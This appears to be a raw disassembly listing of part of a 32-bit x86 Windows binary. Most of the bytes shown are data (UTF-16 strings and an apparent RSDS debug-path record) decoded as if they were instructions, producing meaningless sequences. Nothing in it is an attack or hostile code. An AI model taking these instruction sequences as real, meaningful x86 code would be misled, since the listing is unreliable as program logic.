  42acf2:	dec    edi
  42acf3:	add    BYTE PTR [eax],bh
  42acf5:	add    BYTE PTR [edi+0x0],bl
  42acf8:	inc    esp
  42acf9:	add    BYTE PTR [eax],bh
  42acfb:	add    BYTE PTR [ecx+0x0],cl
  42acfe:	dec    eax
  42acff:	add    BYTE PTR [edi+0x0],cl
  42ad02:	pop    edi
  42ad03:	add    BYTE PTR [ebp+0x0],al
  42ad06:	pop    eax
  42ad07:	add    BYTE PTR [eax],al
  42ad09:	add    BYTE PTR [edx+0x0],dl
  42ad0c:	dec    esp
  42ad0d:	add    BYTE PTR [esi],dh
  42ad0f:	add    BYTE PTR [edi+0x0],bl
  42ad12:	aaa    
  42ad13:	add    BYTE PTR [eax+0x0],bl
  42ad16:	xor    eax,DWORD PTR [eax]
  42ad18:	inc    edi
  42ad19:	add    BYTE PTR [ecx+0x0],dl
  42ad1c:	pop    edi
  42ad1d:	add    BYTE PTR [edx+0x0],cl
  42ad20:	add    BYTE PTR [eax],al
  42ad22:	inc    edi
  42ad23:	add    BYTE PTR [edi+0x0],cl
  42ad26:	push   ebx
  42ad27:	add    BYTE PTR [eax+eax*1],dh
  42ad2a:	pop    edi
  42ad2b:	add    BYTE PTR [ecx+0x0],cl
  42ad2e:	xor    DWORD PTR [eax],eax
  42ad30:	push   esi
  42ad31:	add    BYTE PTR [ebx],dh
  42ad33:	add    BYTE PTR [edi+0x0],bl
  42ad36:	dec    ecx
  42ad37:	add    BYTE PTR [edx+0x0],bl
  42ad3a:	add    BYTE PTR [eax],al
  42ad3c:	inc    ebx
  42ad3d:	add    BYTE PTR [ecx+0x0],bl
  42ad40:	inc    ecx
  42ad41:	add    BYTE PTR [eax],dh
  42ad43:	add    BYTE PTR [ecx],bh
  42ad45:	add    BYTE PTR [edi+0x0],bl
  42ad48:	cmp    DWORD PTR [eax],eax
  42ad4a:	push   eax
  42ad4b:	add    BYTE PTR [eax+eax*1],dh
  42ad4e:	pop    edx
  42ad4f:	add    BYTE PTR [eax],al
  42ad51:	add    BYTE PTR [edx+0x0],al
  42ad54:	inc    esi
  42ad55:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42ad59:	add    BYTE PTR [ebp+0x0],dl
  42ad5c:	push   ebp
  42ad5d:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ad61:	add    BYTE PTR [eax],al
  42ad63:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ad67:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ad6b:	add    BYTE PTR [edi+0x0],bl
  42ad6e:	xor    eax,DWORD PTR [eax]
  42ad70:	cmp    DWORD PTR [eax],eax
  42ad72:	dec    eax
  42ad73:	add    BYTE PTR [edi+0x0],bl
  42ad76:	dec    ebp
  42ad77:	add    BYTE PTR [ecx+0x0],bl
  42ad7a:	cmp    DWORD PTR [eax],eax
  42ad7c:	inc    ecx
  42ad7d:	add    BYTE PTR [esi+0x0],cl
  42ad80:	add    BYTE PTR [eax],al
  42ad82:	inc    ebx
  42ad83:	add    BYTE PTR [eax+0x0],dl
  42ad86:	dec    esi
  42ad87:	add    BYTE PTR [eax+eax*1],dh
  42ad8a:	pop    edi
  42ad8b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ad8f:	add    BYTE PTR [ebx+0x0],cl
  42ad92:	xor    DWORD PTR [eax],eax
  42ad94:	add    BYTE PTR [eax],al
  42ad96:	inc    ecx
  42ad97:	add    BYTE PTR [edi],dh
  42ad99:	add    BYTE PTR [edx+0x0],cl
  42ad9c:	pop    edi
  42ad9d:	add    BYTE PTR [ebx+0x0],al
  42ada0:	cmp    BYTE PTR [eax],al
  42ada2:	push   edi
  42ada3:	add    BYTE PTR [eax+0x0],dl
  42ada6:	pop    edi
  42ada7:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42adab:	add    BYTE PTR [edx],dh
  42adad:	add    BYTE PTR [eax],al
  42adaf:	add    BYTE PTR [edx+0x0],al
  42adb2:	add    BYTE PTR [eax],al
  42adb4:	push   edx
  42adb5:	push   ebx
  42adb6:	inc    esp
  42adb7:	push   ebx
  42adb8:	and    DWORD PTR [eax+0x7bc50ebc],esi
  42adbe:	dec    edi
  42adbf:	inc    ecx
  42adc0:	mov    WORD PTR [ebx+0x21029e7e],?
  42adc6:	out    dx,al
  42adc7:	or     DWORD PTR [eax+eax*1],ebx
  42adca:	add    BYTE PTR [eax],al
  42adcc:	push   ecx
  42adcd:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42add1:	js     0x42ae28
  42add3:	jbe    0x42ae47
  42add5:	arpl   WORD PTR [esi+0x75],dx
  42add8:	popa   
  42add9:	push   esi
  42adda:	pop    esp
  42addb:	outs   dx,DWORD PTR ds:[esi]
  42addc:	ins    DWORD PTR es:[edi],dx
  42addd:	dec    eax
  42adde:	inc    edi
  42addf:	push   0x6c445178
  42ade4:	jbe    0x42ae57
  42ade6:	pop    esp
  42ade7:	push   0x70
  42ade9:	js     0x42ae4c
  42adeb:	ins    BYTE PTR es:[edi],dx
  42adec:	ins    BYTE PTR es:[edi],dx
  42aded:	dec    eax
  42adee:	addr16 pop esp
  42adf0:	push   0x4a
  42adf2:	jb     0x42ae56
  42adf4:	push   esp
  42adf5:	ins    DWORD PTR es:[edi],dx
  42adf6:	push   edx
  42adf7:	bound  eax,QWORD PTR [edi+0x6d]
  42adfa:	push   eax
  42adfb:	arpl   WORD PTR [esi+0x77],ax
  42adfe:	pop    esp
  42adff:	jo     0x42ae6b
  42ae01:	dec    ecx
  42ae02:	inc    ebp
  42ae03:	push   bp
  42ae05:	ins    BYTE PTR es:[edi],dx
  42ae06:	inc    ebp
  42ae07:	dec    ebp
  42ae08:	jne    0x42ae81
  42ae0a:	jbe    0x42ae55
  42ae0c:	cs jo  0x42ae73
  42ae0f:	bound  eax,QWORD PTR [eax]
	...
